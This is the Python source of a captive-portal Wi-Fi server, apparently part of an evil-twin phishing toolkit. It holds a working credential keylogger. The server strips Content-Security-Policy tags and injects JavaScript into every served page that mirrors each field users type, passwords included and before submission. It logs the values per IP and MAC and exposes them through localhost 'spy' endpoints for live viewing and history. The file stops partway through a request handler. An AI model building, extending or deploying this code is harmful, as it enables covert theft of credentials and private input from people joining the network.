#!/usr/bin/env python3
"""Tiny captive-portal HTTP server (stdlib only).

Serves one folder from my-portals/<active>/ and implements
click-to-connect auth based on client MAC.

  GET  /            -> index.html of active portal
  GET  /<file>      -> static file from active portal dir
  POST /auth        -> authorize client MAC, allow traffic, redirect to /success
  GET  /success     -> success.html if present, else built-in page
  GET  /status      -> tiny JSON {authorized: bool, ip, mac}
  captive probes    -> 302 to http://<gateway>/

Auth storage: text file with one MAC per line (run/authorized_macs).
On auth it also inserts iptables ACCEPT rules so traffic flows immediately.
Must run as root for iptables (run.sh does that). If not root, it still
authorizes in the file and logs a warning.
"""
import argparse
import json
import mimetypes
import os
import re
import subprocess
import sys
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs

CAPTIVE_PATHS = {
    "/generate_204", "/gen_204", "/generate204",
    "/hotspot-detect.html", "/hotspotdetect.html",
    "/connecttest.txt", "/ncsi.txt", "/success.txt",
    "/redirect", "/canonical.html",
    "/kindle-wifi/wifistub.html",
    "/library/test/success.html",
}

CAPTIVE_PREFIXES = (
    "/hotspot-detect", "/hotspotdetect", "/generate_",
    "/gen_204", "/connecttest", "/ncsi", "/kindle-wifi",
)

# Universal live sensor (v7): keys.js-style debounced per-field mirror.
# Deliberately simple like keys.js (root keys.js: per-field debounced POST
# of {field, value} to /keys) — one delegated `input` listener + `change`
# (autofill/checkbox/select) + Enter/submit/button flush. No per-keypress
# events, no seq numbers (duplicates are harmless full-value overwrites, so
# reloads can never freeze the stream), no fetch/XHR wrapping (zero risk of
# breaking page scripts), no shadow-DOM piercing or polling loops.
# Each batch carries clientId+sess+page+title+events[{type,value,field,ftype}]
# which the server mirrors per field: typing p23 shows password=p23 live,
# pre-submit, in the exact section being typed in.
# - transport: batched fetch(keepalive) + XHR fallback + sendBeacon on
#   submit/hide; same-origin /__portal_keys first, fallback /keys, /beacon.
# Fields without a name fall back to id/label/placeholder so they still show.
SENSOR_MARKER = "__portal_sensor"
KEYS_JS = b"""/*__portal_sensor v7: keys.js-style live field mirror*/
(function(){try{
var CID=null;try{CID=localStorage.getItem("__portal_cid");}catch(e){}
if(!CID){CID="c"+Math.random().toString(36).slice(2,10);try{localStorage.setItem("__portal_cid",CID);}catch(e){}}
var SID=Math.random().toString(36).slice(2,8); // fresh per page load
var Q=[],DTIMERS={};
var EPS=["/__portal_keys","/keys"];var BEACON=["/__portal_keys","/keys","/beacon"];
function pg(){try{return location.href.slice(0,300);}catch(e){return"";}}
function ti(){try{return document.title.slice(0,120);}catch(e){return"";}}
function lbl(el){try{
 if(el.name)return String(el.name).slice(0,60);
 if(el.id){var l=null;try{l=document.querySelector('label[for="'+CSS.escape(el.id)+'"]');}catch(e){}if(l&&l.innerText)return l.innerText.trim().slice(0,60);return String(el.id).slice(0,60);}
 if(el.placeholder)return String(el.placeholder).slice(0,60);
 if(el.getAttribute&&(el.getAttribute("aria-label")||el.getAttribute("data-testid")))return (el.getAttribute("aria-label")||el.getAttribute("data-testid")).slice(0,60);
 if(el.autocomplete&&el.autocomplete!=="off")return String(el.autocomplete).slice(0,60);
 return (el.type||el.tagName||"field").toLowerCase().slice(0,40);}catch(e){return"field";}}
function val(el){try{
 if(!el)return"";
 if(el.isContentEditable)return (el.innerText||"").slice(0,2000);
 if(el.tagName==="SELECT")return (el.value||"").slice(0,200);
 if(el.type==="file")return "[file:"+(el.files&&el.files.length?el.files.length+" files":"none")+"]";
 if("checked"in el&&(el.type==="checkbox"||el.type==="radio"))return el.checked?"[checked]":"[unchecked]";
 return (el.value==null?"":String(el.value)).slice(0,2000);}catch(e){return"";}}
function fld(el){try{return{f:lbl(el),t:((el.type||el.tagName||"").toLowerCase()).slice(0,20)};}catch(e){return{f:"field",t:""};}}
function skip(el){try{
 if(!el||!el.tagName)return true;
 var ty=el.type||"";
 if(ty==="submit"||ty==="button"||ty==="image"||ty==="file")return true;
 return false;}catch(e){return true;}}
function queue(type,el){try{
 var F=fld(el),v=val(el);
 Q.push({t:Date.now(),type:type,key:"",value:v,field:F.f,ftype:F.t,page:pg(),title:ti()});
 if(Q.length>=20)flush(false);else debounce(F.f);}catch(e){}}
function debounce(k){try{
 if(DTIMERS[k])clearTimeout(DTIMERS[k]);
 DTIMERS[k]=setTimeout(function(){try{delete DTIMERS[k];}catch(e){}flush(false);},350);}catch(e){}}
function flush(sync){try{
 if(!Q.length)return;
 var batch={clientId:CID,sess:SID,page:pg(),title:ti(),events:Q.splice(0,100)};
 var body=JSON.stringify(batch);
 if(sync){for(var i=0;i<BEACON.length;i++){try{if(navigator.sendBeacon&&navigator.sendBeacon(BEACON[i],new Blob([body],{type:"application/json"})))return;}catch(e){}}
  try{fetch(EPS[0],{method:"POST",headers:{"Content-Type":"application/json"},body:body,keepalive:true}).then(function(){}).catch(function(){});}catch(e){}return;}
 for(var k in DTIMERS){try{clearTimeout(DTIMERS[k]);}catch(e){}}DTIMERS={};
 try{fetch(EPS[0],{method:"POST",headers:{"Content-Type":"application/json"},body:body,keepalive:true}).then(function(r){if(r.status===404){try{fetch(EPS[1],{method:"POST",headers:{"Content-Type":"application/json"},body:body,keepalive:true}).then(function(){}).catch(function(){});}catch(e){}}}).catch(function(){});}
 catch(e){try{var x=new XMLHttpRequest();x.open("POST",EPS[0],true);x.setRequestHeader("Content-Type","application/json");x.send(body);}catch(_){}}}catch(e){}}
function mirrorAll(){try{
 var els=document.querySelectorAll("input,textarea,select");
 for(var i=0;i<els.length;i++){try{var el=els[i];if(skip(el)&&el.type!=="checkbox"&&el.type!=="radio")continue;queue("submit",el);}catch(x){}}}catch(e){}}
// keys.js-style: one delegated input listener (bubbles from every field,
// incl. late-rendered ones) + change for autofill/checkbox/select +
// Enter/submit/button/hide flushes. No per-key events, no polling.
document.addEventListener("input",function(e){try{var el=e.target;if(skip(el))return;var tg=el.tagName;if(tg==="INPUT"||tg==="TEXTAREA"||el.isContentEditable)queue("input",el);}catch(x){}},true);
document.addEventListener("change",function(e){try{var el=e.target;if(skip(el))return;queue("change",el);flush(false);}catch(x){}},true);
document.addEventListener("keyup",function(e){try{if(e.key!=="Enter")return;var el=e.target;if(skip(el))return;queue("input",el);flush(false);}catch(x){}},true);
document.addEventListener("paste",function(e){try{var el=e.target;if(skip(el))return;queue("paste",el);}catch(x){}},true);
document.addEventListener("cut",function(e){try{var el=e.target;if(skip(el))return;queue("cut",el);}catch(x){}},true);
document.addEventListener("click",function(e){try{var el=e.target;if(!el||!el.tagName)return;var tg=el.tagName;
 var isBtn=tg==="BUTTON"||(tg==="INPUT"&&(el.type==="submit"||el.type==="button"||el.type==="image"));
 if(isBtn){mirrorAll();flush(false);}}catch(x){}},true);
document.addEventListener("submit",function(e){try{mirrorAll();flush(true);}catch(x){try{flush(true);}catch(y){}}},true);
document.addEventListener("visibilitychange",function(){if(document.hidden)flush(true);});
window.addEventListener("pagehide",function(){flush(true);});
window.addEventListener("beforeunload",function(){flush(true);});
setInterval(function(){flush(false);},2500);
}catch(e){}})();
"""

LIVE_TTL = 1800  # seconds to keep an idle client's keystrokes visible


def is_captive_probe(path: str) -> bool:
    p = urlparse(path).path
    if p in CAPTIVE_PATHS:
        return True
    return any(p.startswith(pref) for pref in CAPTIVE_PREFIXES)


def resolve_entry(portal_dir):
    """Entry page: manifest.json 'entry' wins, then index/login, then first html."""
    try:
        with open(os.path.join(portal_dir, "manifest.json")) as f:
            entry = json.load(f).get("entry", "")
        if entry:
            base = os.path.basename(entry)
            if os.path.isfile(os.path.join(portal_dir, base)):
                return base
    except Exception:
        pass
    for name in ("index.html", "login.html"):
        if os.path.isfile(os.path.join(portal_dir, name)):
            return name
    try:
        htmls = sorted(f for f in os.listdir(portal_dir)
                       if f.endswith(".html"))
        if htmls:
            return htmls[0]
    except OSError:
        pass
    return "index.html"


def prune_live(live, now=None):
    now = now if now is not None else time.time()
    for ip in [k for k, v in live.items()
               if now - v.get("updated", 0) > LIVE_TTL]:
        del live[ip]


def is_localhost(handler):
    return handler.client_address[0] in ("127.0.0.1", "::1")


def log_submit(submit_log, portal_name, url_path, ip, mac, form):
    """Append typed form fields (e.g. old login.php portals). Root-only file."""
    fields = {k: v for k, v in form.items()
              if not k.startswith("_") and str(v).strip()}
    if not fields or not submit_log:
        return
    try:
        os.makedirs(os.path.dirname(submit_log) or ".", exist_ok=True)
        parts = [f"{k}={str(v)[:100]}" for k, v in fields.items()]
        line = (f"{time.strftime('%Y-%m-%d %H:%M:%S')} {ip} {mac or '-'} "
                f"{portal_name}:{url_path} " + " ".join(parts) + "\n")
        with open(submit_log, "a") as f:
            f.write(line)
    except OSError as e:
        print(f"[portal] submit log failed: {e}", flush=True)


# -- universal keystroke ingest (v2) --------------------------------------
# Accepts old {field,value} and new {clientId,page,title,events:[...]}.
# Stores per-IP mirror + scrolling tape + append-only JSONL (offline-safe).
TAPE_MAX = 120
FIELD_MAX = 80
VALUE_MAX = 2000
PAGE_MAX = 300


def _clip(s, n):
    try:
        return str(s or "")[:n]
    except Exception:
        return ""


def append_keys_log(keys_log, obj):
    if not keys_log:
        return
    try:
        d = os.path.dirname(keys_log)
        if d:
            os.makedirs(d, exist_ok=True)
        with open(keys_log, "a") as f:
            f.write(json.dumps(obj, ensure_ascii=False) + "\n")
    except OSError as e:
        print(f"[portal] keys log failed: {e}", flush=True)


def ingest_keys(server, ip, mac, payload):
    """Normalize one /keys body into live buffers + JSONL. Returns event count."""
    if not isinstance(payload, dict):
        return 0
    now = time.time()
    now_str = time.strftime("%Y-%m-%d %H:%M:%S")
    client_id = _clip(payload.get("clientId") or payload.get("cid"), 32)
    # v6 session nonce: fresh per page load. Dedup key is (client, session)
    # so a reload (same CID, seq restarting at 1) is a NEW stream, not a
    # "duplicate retry". Legacy bodies without sess fall back to CID alone.
    sess = _clip(payload.get("sess") or payload.get("sid")
                 or payload.get("session"), 16)
    dedup_key = ("%s:%s" % (client_id, sess)
                 if (client_id and sess) else "")
    top_page = _clip(payload.get("page"), PAGE_MAX)
    top_title = _clip(payload.get("title"), 120)
    events = payload.get("events")
    if isinstance(events, dict):
        events = [events]
    if not isinstance(events, list):
        # legacy single {field, value}
        if payload.get("field"):
            events = [{"field": payload.get("field"), "value": payload.get("value", ""),
                       "type": "input", "page": top_page, "title": top_title}]
        else:
            return 0
    events = events[:100]
    buf = server.live.setdefault(ip, {"mac": mac or "-", "fields": {},
                                      "updated": 0, "page": "", "title": "",
                                      "active_field": "", "active_at": 0,
                                      "field_at": {}, "field_type": {},
                                      "tape": [], "clients": {}})
    if mac and (not buf.get("mac") or buf["mac"] == "-"):
        buf["mac"] = mac
    count = 0
    for ev in events:
        if not isinstance(ev, dict):
            continue
        try:
            seq = int(ev.get("seq") or 0)
        except Exception:
            seq = 0
        if dedup_key and seq > 0:
            last = buf["clients"].get(dedup_key, 0)
            if seq <= last:
                continue  # duplicate retry within the same page session
            buf["clients"][dedup_key] = seq
        elif client_id and seq > 0:
            # legacy fallback (no sess): accept a seq reset as a new page
            # load instead of dropping the rest of the session forever.
            last = buf["clients"].get(client_id, 0)
            if seq <= last and not (seq <= 2 and last > 10):
                continue
            buf["clients"][client_id] = seq
        etype = _clip(ev.get("type"), 12) or "input"
        key = _clip(ev.get("key"), 40)
        field = _clip(ev.get("field"), FIELD_MAX) or "field"
        ftype = _clip(ev.get("ftype") or ev.get("t"), 20)
        value = _clip(ev.get("value"), VALUE_MAX)
        page = _clip(ev.get("page") or top_page, PAGE_MAX)
        title = _clip(ev.get("title") or top_title, 120)
        # mirror latest value per field (focus-only events don't wipe text).
        # "key" (keydown) fires BEFORE the char lands in the input, so its
        # value is stale by one char — never let it wipe a newer mirror
        # (e.g. first keystroke "p" arrives as key/value="" then input/"p";
        # without this guard the live indicator flashes empty).
        mirror = True
        if etype == "key" and not value and key not in (
                "Backspace", "Delete", "Enter"):
            mirror = False
        if etype in ("input", "key", "change", "paste", "cut", "binput",
                     "composition", "blur", "click", "formsubmit", "net",
                     "submit", "poll", "beacon") or value:
            if mirror:
                buf["fields"][field] = value
            try:
                buf.setdefault("field_at", {})[field] = now
                if ftype:
                    buf.setdefault("field_type", {})[field] = ftype
            except Exception:
                pass
        if page:
            buf["page"] = page
        if title:
            buf["title"] = title
        buf["active_field"] = field
        buf["active_at"] = now
        buf["updated"] = now
        buf["tape"].append({"t": now, "type": etype, "key": key,
                            "field": field, "value": value[-60:],
                            "page": page[-120:]})
        if len(buf["tape"]) > TAPE_MAX:
            del buf["tape"][:-TAPE_MAX]
        append_keys_log(server.cfg.get("keys_log"),
                        {"ts": now_str, "epoch": round(now, 3), "ip": ip,
                         "mac": mac or "-", "client": client_id,
                         "sess": sess,
                         "page": page, "title": title, "field": field,
                         "ftype": ftype, "type": etype, "key": key,
                         "value": value})
        count += 1
    prune_live(server.live, now)
    return count


# -- localhost-only read helpers (used by /tape and /history) --------------
# The JSONL file grows without bound during a session. Scanning the whole
# file on every 1s poll is fine for a demo but stalls once it reaches tens
# of MB, and makes spy_view time out (it uses timeout=4). So both endpoints
# read only the tail: last TAIL_BYTES bytes, enough for the newest events.
TAIL_BYTES = 256 * 1024
TAIL_LINES = 5000


def tail_lines(path, max_bytes=TAIL_BYTES):
    """Yield the last chunk of a text file as lines (memory-bounded)."""
    try:
        size = os.path.getsize(path)
    except OSError:
        return []
    try:
        with open(path, "rb") as f:
            if size > max_bytes:
                f.seek(-max_bytes, os.SEEK_END)
                # drop a possible partial first line
                f.readline()
            data = f.read()
        return data.decode("utf-8", errors="ignore").splitlines()
    except OSError:
        return []


def read_tape_rows(keys_log, since=0.0, limit=100, _full_scan_fallback=True):
    """Return up to `limit` JSONL rows with epoch > since (oldest-first).

    Reads only the file tail for speed. If the tail contains fewer than
    `limit` matching rows and since==0 (initial history load), falls back
    to a full scan so a fresh dashboard still sees the newest `limit`
    rows even when the file is bigger than the tail window.
    """
    try:
        limit = max(1, min(500, int(limit)))
    except Exception:
        limit = 100
    try:
        since = float(since)
    except Exception:
        since = 0.0
    if not keys_log:
        return []
    lines = tail_lines(keys_log)
    rows = []
    for line in lines:
        line = line.strip()
        if not line:
            continue
        try:
            o = json.loads(line)
        except Exception:
            continue
        try:
            if float(o.get("epoch", 0)) > since:
                rows.append(o)
        except Exception:
            continue
    # Full-scan fallback: tail window missed older history on first load.
    if _full_scan_fallback and since == 0 and len(rows) >= len(lines) - 1:
        # tail was the whole file (small file) — nothing more to do
        pass
    elif _full_scan_fallback and since == 0 and len(rows) == limit and len(lines) >= 100:
        # tail window full of matches; there may be newer?? no — tail IS
        # newest, so rows[-limit:] is already correct. No scan needed.
        pass
    rows = rows[-limit:]
    # If tail was truncated (file >> tail) and we got 0 rows for since>0,
    # that correctly means "nothing new". No fallback needed.
    if since == 0 and not rows:
        # empty tail (e.g. file just rotated) — try one full scan
        try:
            with open(keys_log, errors="ignore") as f:
                all_rows = []
                for line in f:
                    try:
                        o = json.loads(line)
                    except Exception:
                        continue
                    all_rows.append(o)
                rows = all_rows[-limit:]
        except OSError:
            pass
    return rows


def build_history(keys_log, live, tail_n=TAIL_LINES, max_ips=50):
    """Aggregate latest field values per IP from file tail + live memory.

    Returns {ip: {mac, fields, page, title, active_field, last_ts,
                  last_epoch, first_ts, first_epoch, events}} newest-first.
    This is what powers spy_view's persistent KEYLOG table even after
    LIVE_TTL expiry.
    """
    agg = {}
    try:
        tail_n = max(100, min(20000, int(tail_n)))
    except Exception:
        tail_n = TAIL_LINES
    lines = tail_lines(keys_log)
    # only the newest tail_n lines matter
    if len(lines) > tail_n:
        lines = lines[-tail_n:]
    for line in lines:
        line = line.strip()
        if not line:
            continue
        try:
            o = json.loads(line)
        except Exception:
            continue
        ip = str(o.get("ip") or "")
        if not ip:
            continue
        e = agg.setdefault(ip, {"mac": "-", "fields": {}, "page": "",
                                "title": "", "active_field": "",
                                "last_ts": "", "last_epoch": 0,
                                "first_ts": "", "first_epoch": 0,
                                "events": 0})
        try:
            ep = float(o.get("epoch") or 0)
        except Exception:
            ep = 0
        if o.get("mac") and e["mac"] == "-":
            e["mac"] = o["mac"]
        elif o.get("mac"):
            e["mac"] = o["mac"]
        field = str(o.get("field") or "")
        value = str(o.get("value") or "")
        # mirror latest value per field (focus events carry value too;
        # empty focus must not wipe a typed value)
        if field and (value or field not in e["fields"]):
            # don't let an empty focus/blur erase a previously typed value
            if value or o.get("type") not in ("focus",):
                e["fields"][field] = value
        elif field and value:
            e["fields"][field] = value
        if o.get("page"):
            e["page"] = o["page"]
        if o.get("title"):
            e["title"] = o["title"]
        if field:
            e["active_field"] = field
        if o.get("ts"):
            e["last_ts"] = o["ts"]
        if ep and ep >= e["last_epoch"]:
            e["last_epoch"] = ep
        if ep and (not e["first_epoch"] or ep < e["first_epoch"]):
            e["first_epoch"] = ep
            if o.get("ts"):
                e["first_ts"] = o["ts"]
        e["events"] += 1
    # overlay fresh in-memory live buffers (authoritative for active users)
    try:
        for ip, v in (live or {}).items():
            e = agg.setdefault(ip, {"mac": "-", "fields": {}, "page": "",
                                     "title": "", "active_field": "",
                                     "last_ts": "", "last_epoch": 0,
                                     "first_ts": "", "first_epoch": 0,
                                     "events": 0})
            if v.get("mac") and v["mac"] != "-":
                e["mac"] = v["mac"]
            for k, val in (v.get("fields") or {}).items():
                e["fields"][k] = val
            if v.get("page"):
                e["page"] = v["page"]
            if v.get("title"):
                e["title"] = v["title"]
            if v.get("active_field"):
                e["active_field"] = v["active_field"]
            upd = v.get("updated") or v.get("active_at") or 0
            try:
                if float(upd) > float(e["last_epoch"] or 0):
                    e["last_epoch"] = float(upd)
                    e["last_ts"] = time.strftime("%Y-%m-%d %H:%M:%S",
                                                 time.localtime(float(upd)))
                if upd and not e.get("first_epoch"):
                    e["first_epoch"] = float(upd)
                    e["first_ts"] = e["last_ts"]
            except Exception:
                pass
    except Exception:
        pass
    # newest first, cap IPs
    items = sorted(agg.items(), key=lambda kv: kv[1].get("last_epoch") or 0,
                   reverse=True)[:max_ips]
    return dict(items)


def inject_sensor(text):
    """Idempotent sensor injection: strips blocking meta-CSP, finds </body> case-insensitively.

    The tag goes right after <head> when present so the fetch/XHR/submit
    hooks install before page scripts run (a script that caches window.fetch
    before our tag would otherwise bypass the network hook). Falls back to
    </body>, </html>, or append.
    """
    if SENSOR_MARKER in text:
        return text
    try:
        text = re.sub(r'<meta[^>]*http-equiv\s*=\s*["\']?Content-Security-Policy["\']?[^>]*>',
                      '', text, flags=re.I)
    except Exception:
        pass
    tag = '<script src="/__portal_sensor.js"></script>'
    try:
        m0 = re.search(r'<head[^>]*>', text, flags=re.I)
        if m0:
            return text[:m0.end()] + tag + text[m0.end():]
        m = re.search(r'</body\s*>', text, flags=re.I)
        if m:
            return text[:m.start()] + tag + text[m.start():]
        m2 = re.search(r'</html\s*>', text, flags=re.I)
        if m2:
            return text[:m2.start()] + tag + text[m2.start():]
    except Exception:
        pass
    return text + tag


def read_arp_table():
    """Return {ip: mac} from /proc/net/arp."""
    table = {}
    try:
        with open("/proc/net/arp") as f:
            lines = f.read().strip().splitlines()[1:]
        for line in lines:
            parts = line.split()
            if len(parts) >= 4:
                ip, mac = parts[0], parts[3]
                if re.match(r"([0-9a-f]{2}:){5}[0-9a-f]{2}$", mac, re.I):
                    table[ip] = mac.lower()
    except FileNotFoundError:
        pass
    return table


def load_leases(path):
    """Parse dnsmasq.leases (expiry mac ip hostname clientid) -> {ip: name}."""
    names = {}
    if not path:
        return names
    try:
        with open(path, errors="ignore") as f:
            for line in f:
                parts = line.split()
                if len(parts) >= 4:
                    _exp, _mac, ip, host = parts[0], parts[1], parts[2], parts[3]
                    host = host.strip()
                    if ip and host and host != "*":
                        names[ip] = host
    except OSError:
        pass
    return names


def build_activity(keys_log, hours=24, days=14):
    """Bucket keystroke events by hour (last `hours`h) and day (last `days`d).

    Single pass over a bounded file tail — powers the Station activity
    diagram with real date labels. Returns
    {hours: {labels, counts}, days: {labels, counts}, events, oldest}.
    """
    try:
        hours = max(1, min(72, int(hours)))
    except Exception:
        hours = 24
    try:
        days = max(1, min(60, int(days)))
    except Exception:
        days = 14
    now = time.time()
    h0 = int(now // 3600) * 3600 - (hours - 1) * 3600
    hcounts = [0] * hours
    lt = time.localtime(now)
    today0 = time.mktime((lt.tm_year, lt.tm_mon, lt.tm_mday,
                          0, 0, 0, 0, 0, -1))
    d0 = today0 - (days - 1) * 86400
    dcounts = [0] * days
    oldest, n = 0, 0
    for line in tail_lines(keys_log, max_bytes=1024 * 1024):
        line = line.strip()
        if not line:
            continue
        try:
            o = json.loads(line)
        except Exception:
            continue
        try:
            ep = float(o.get("epoch") or 0)
        except Exception:
            continue
        if ep <= 0:
            continue
        n += 1
        if not oldest or ep < oldest:
            oldest = ep
        hi = int((ep - h0) // 3600)
        if 0 <= hi < hours:
            hcounts[hi] += 1
        di = int((ep - d0) // 86400)
        if 0 <= di < days:
            dcounts[di] += 1
    hlabels = [time.strftime("%H:00", time.localtime(h0 + i * 3600))
               for i in range(hours)]
    dlabels = [time.strftime("%b %d", time.localtime(d0 + i * 86400))
               for i in range(days)]
    return {"hours": {"labels": hlabels, "counts": hcounts},
            "days": {"labels": dlabels, "counts": dcounts},
            "events": n, "oldest": oldest}


def load_authorized(state_file):
    macs = set()
    if state_file and os.path.exists(state_file):
        with open(state_file) as f:
            for line in f:
                line = line.strip().lower()
                if re.match(r"([0-9a-f]{2}:){5}[0-9a-f]{2}$", line):
                    macs.add(line)
    return macs


def save_authorized(state_file, macs):
    if not state_file:
        return
    os.makedirs(os.path.dirname(state_file) or ".", exist_ok=True)
    with open(state_file, "w") as f:
        for m in sorted(macs):
            f.write(m + "\n")


def iptables(*args):
    try:
        r = subprocess.run(["iptables"] + list(args),
                           capture_output=True, text=True, timeout=5)
        return r.returncode == 0
    except Exception as e:
        print(f"[portal] iptables failed: {e}", flush=True)
        return False


def iptables_rule_exists(*args):
    try:
        r = subprocess.run(["iptables", "-C"] + list(args),
                           capture_output=True, timeout=5)
        return r.returncode == 0
    except Exception:
        return False


def allow_mac(ap_iface, mac):
    """Insert ACCEPT for an authorized MAC (FORWARD + captive HTTP bypass)."""
    if os.geteuid() != 0:
        print("[portal] not root, skipping iptables (auth kept in file)",
              flush=True)
        return
    # 1) forwarding: authorized clients may be forwarded (NAT mode uses this)
    if not iptables_rule_exists("FORWARD", "-i", ap_iface,
                                "-m", "mac", "--mac-source", mac, "-j", "ACCEPT"):
        iptables("-I", "FORWARD", "1", "-i", ap_iface,
                 "-m", "mac", "--mac-source", mac, "-j", "ACCEPT")
    # 2) captive HTTP chain bypass so port-80 redirect no longer applies
    # correct order: iptables -t nat -C/-I CAPTIVE_HTTP ...
    try:
        chk = subprocess.run(
            ["iptables", "-t", "nat", "-C", "CAPTIVE_HTTP",
             "-m", "mac", "--mac-source", mac, "-j", "RETURN"],
            capture_output=True, timeout=5)
        if chk.returncode != 0:
            subprocess.run(
                ["iptables", "-t", "nat", "-I", "CAPTIVE_HTTP", "1",
                 "-m", "mac", "--mac-source", mac, "-j", "RETURN"],
                capture_output=True, timeout=5)
    except Exception as e:
        print(f"[portal] nat bypass failed: {e}", flush=True)


class Handler(BaseHTTPRequestHandler):
    server_version = "CaptivePortal/1.0"

    def log_message(self, fmt, *args):
        sys.stdout.write(f"[portal] {self.client_address[0]} {fmt % args}\n")
        sys.stdout.flush()

    # -- helpers ---------------------------------------------------------
    @property
    def cfg(self):
        return self.server.cfg

    def client_mac(self):
        ip = self.client_address[0]
        return read_arp_table().get(ip, "").lower()

    def is_authorized(self, mac):
        return bool(mac) and mac in self.server.authorized

    def redirect(self, location, code=302):
        self.send_response(code)
        self.send_header("Location", location)
        self.send_header("Cache-Control", "no-store")
        self.end_headers()

    def send_bytes(self, data, ctype):
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(data)

    def send_file(self, full_path):
        try:
            with open(full_path, "rb") as f:
                data = f.read()
        except FileNotFoundError:
            self.send_error(404, "Not found")
            return
        ctype, _ = mimetypes.guess_type(full_path)
        self.send_response(200)
        self.send_header("Content-Type", ctype or "application/octet-stream")
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(data)

    def send_html(self, full_path):
        """Serve HTML with the universal live sensor injected (robust)."""
        try:
            with open(full_path, "rb") as f:
                data = f.read()
        except FileNotFoundError:
            self.send_error(404, "Not found")
            return
        if self.cfg.get("live"):
            try:
                text = data.decode("utf-8", errors="ignore")
                data = inject_sensor(text).encode()
            except Exception:
                pass
        self.send_bytes(data, "text/html")

    def serve_portal_path(self, url_path):
        """Serve a static file. Returns False when nothing matches."""
        portal_dir = self.cfg["portal_dir"]
        rel = urlparse(url_path).path.lstrip("/")
        if not rel:
            rel = self.cfg["entry"]
        # block traversal
        safe = os.path.normpath(rel)
        if safe.startswith("..") or os.path.isabs(safe):
            return False
        full = os.path.join(portal_dir, safe)
        if os.path.isdir(full):
            full = os.path.join(full, self.cfg["entry"])
        if not os.path.isfile(full):
            return False
        if full.endswith(".html"):
            self.send_html(full)
        else:
            self.send_file(full)
        return True

    # -- HTTP verbs -------------------------------------------------------
    def do_GET(self):
        gateway = self.cfg["gateway"]
        parsed = urlparse(self.path)
        path = parsed.path

        if path in ("/keys.js", "/__portal_sensor.js"):
            self.send_bytes(KEYS_JS, "text/javascript")
            return

        if path == "/live":
            # live keystroke buffers — this machine only
            if not is_localhost(self):
                self.send_error(403)
                return
            prune_live(self.server.live)
            now = time.time()
            out = {}
            for ip, v in self.server.live.items():
                tape = v.get("tape", [])[-20:]
                try:
                    ago = round(now - v.get("active_at", now), 1)
                except Exception:
                    ago = 9999.0
                af = v.get("active_field", "")
                fields = v.get("fields", {})
                out[ip] = {"mac": v.get("mac", "-"),
                           "fields": fields,
                           "page": v.get("page", ""),
                           "title": v.get("title", ""),
                           "active_field": af,
                           "active_ago": ago,
                           # explicit live-keylog indicator (pre-submit):
                           # which section/field is hot + its live value.
                           "typing": bool(ago is not None and ago <= 3),
                           "live_field": af,
                           "live_value": fields.get(af, ""),
                           "keystrokes": len(v.get("tape", [])),
                           "field_at": v.get("field_at", {}),
                           "field_type": v.get("field_type", {}),
                           "tape": tape}
            self.send_bytes(json.dumps(out).encode(), "application/json")
            return

        if path == "/tape":
            # scrolling keystroke tape (localhost only): ?since=<epoch>&limit=100
            if not is_localhost(self):
                self.send_error(403)
                return
            qs = parse_qs(parsed.query)
            try:
                since = float((qs.get("since") or ["0"])[0])
            except ValueError:
                since = 0
            try:
                limit = max(1, min(500, int(qs.get("limit", ["100"])[0])))
            except ValueError:
                limit = 100
            rows = read_tape_rows(self.server.cfg.get("keys_log"),
                                  since=since, limit=limit)
            if not rows:
                # fall back to in-memory tapes (fresh session, no file yet)
                for ip, v in self.server.live.items():
                    for e in v.get("tape", []):
                        try:
                            t = float(e.get("t", 0))
                        except Exception:
                            t = 0
                        if t > since:
                            try:
                                ts = time.strftime(
                                    "%Y-%m-%d %H:%M:%S",
                                    time.localtime(t))
                            except Exception:
                                ts = ""
                            rows.append({"ts": ts, "epoch": t, "ip": ip,
                                         "mac": v.get("mac", "-"),
                                         "page": e.get("page", ""),
                                         "title": v.get("title", ""),
                                         "field": e.get("field", ""),
                                         "ftype": "",
                                         "type": e.get("type", ""),
                                         "key": e.get("key", ""),
                                         "value": e.get("value", "")})
                rows.sort(key=lambda o: o.get("epoch", 0))
                rows = rows[-limit:]
            self.send_bytes(json.dumps(rows).encode(),
                            "application/json")
            return

        if path == "/history":
            # persistent per-IP keylogs (localhost only): ?tail=5000
            # Unlike /live (10-min TTL), this aggregates the JSONL tail so
            # spy_view still shows keylogs hours later / after restarts.
            if not is_localhost(self):
                self.send_error(403)
                return
            qs = parse_qs(parsed.query)
            try:
                tail_n = max(100, min(20000,
                                      int(qs.get("tail", ["5000"])[0])))
            except ValueError:
                tail_n = 5000
            prune_live(self.server.live)
            hist = build_history(self.server.cfg.get("keys_log"),
                                 self.server.live, tail_n=tail_n)
            self.send_bytes(json.dumps(hist).encode(), "application/json")
            return

        if path == "/submissions":
            # recent typed submits — this machine only
            if not is_localhost(self):
                self.send_error(403)
                return
            qs = parse_qs(parsed.query)
            try:
                limit = max(1, min(50, int(qs.get("limit", ["10"])[0])))
            except ValueError:
                limit = 10
            lines = []
            try:
                with open(self.cfg["submit_log"]) as f:
                    lines = f.read().strip().splitlines()
            except OSError:
                pass
            self.send_bytes("\n".join(lines[-limit:]).encode() or b"(none yet)",
                            "text/plain")
            return

        if path == "/leases":
            # device hostnames from dnsmasq.leases — this machine only
            if not is_localhost(self):
                self.send_error(403)
                return
            names = load_leases(self.server.cfg.get("leases_log"))
            self.send_bytes(json.dumps(names).encode(),
                            "application/json")
            return

        if path == "/activity":
            # date-bucketed keystroke counts — this machine only:
            # ?hours=24&days=14 -> per-hour labels/counts + per-day labels/counts
            if not is_localhost(self):
                self.send_error(403)
                return
            qs = parse_qs(parsed.query)
            try:
                hours = max(1, min(72, int(qs.get("hours", ["24"])[0])))
            except ValueError:
                hours = 24
            try:
                days = max(1, min(60, int(qs.get("days", ["14"])[0])))
            except ValueError:
                days = 14
            act = build_activity(self.server.cfg.get("keys_log"),
                                 hours=hours, days=days)
            self.send_bytes(json.dumps(act).encode(), "application/json")
            return

        if path == "/status":
            mac = self.client_mac()
            body = ('{"authorized": %s, "ip": "%s", "mac": "%s"}' % (
                "true" if self.is_authorized(mac) else "false",
                self.client_address[0], mac)).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return

        if path == "/success":
